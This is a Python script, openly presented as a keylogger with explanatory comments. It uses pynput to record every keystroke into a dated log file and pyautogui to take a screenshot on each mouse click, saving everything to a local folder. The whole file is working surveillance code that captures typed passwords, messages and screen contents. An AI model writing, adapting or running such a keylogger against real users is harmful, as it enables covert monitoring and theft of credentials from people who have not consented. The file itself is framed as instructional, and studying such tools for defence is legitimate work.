# Capturing mouse and keyboard actions with the pynput library. Installation: pip install pynput
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener

# Importing the datetime library
from datetime import datetime

# Importing the operating system library and its functionalities
import re
import os

# Importing the automation library
import pyautogui as py

# Storing the current date and time in a variable
currentDate = datetime.now()

# Storing only the day and month in a variable using "%d" for day and "%m" for month
date = currentDate.strftime("%d-%m")

# Storing the root directory and how the files will be saved in a variable
rootDirectory = "../../keylogger-" + date + "/"

# Creating a log file
logFile = rootDirectory + "keylogger.log"

# Tries to create the file defined in the "rootDirectory" variable
try:
    os.mkdir(rootDirectory)
except:
    pass

"""
Creating a function to capture keyboard actions. The "tecla" variable is used to capture the pressed key.
"""
def on_press(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.tab', '\t', tecla)
    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    with open(logFile, 'a') as log:
        if str(tecla) == str("apagar"):
            if os.stat(logFile).st_size != 0:
                tecla = re.sub(r'Key.backspace', '', tecla)
                log.seek(0,2)
                character = log.tell()
                log.truncate(character - 1)
        else:
            log.write(tecla)

# Creating a function to capture the screen every time the mouse is clicked
"""
We need to pass "x" and "y" to show the position where the mouse was clicked, "button" to show which button was clicked,
and "pressed" to be activated every time it is clicked.
"""
def on_click(x, y, button, pressed):
    if pressed:
        # Taking a screenshot with pyautogui
        myScreenshot = py.screenshot()
        hour = datetime.now()
        screenshotTime = hour.strftime("%H_%M_%S")
        myScreenshot.save(os.path.join(rootDirectory, "printKeylogger_" + screenshotTime +".jpg"))

"""
Creating a variable to store the pynput library, passing an auxiliary function "on_press" and "on_click" that means
"pressing" and "clicking", and passing the function we created called "on_press" and "on_click".
"""
keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

# Starting to "listen" to the keyboard and mouse
keyboardListener.start()
mouseListener.start()

keyboardListener.join()
mouseListener.join()
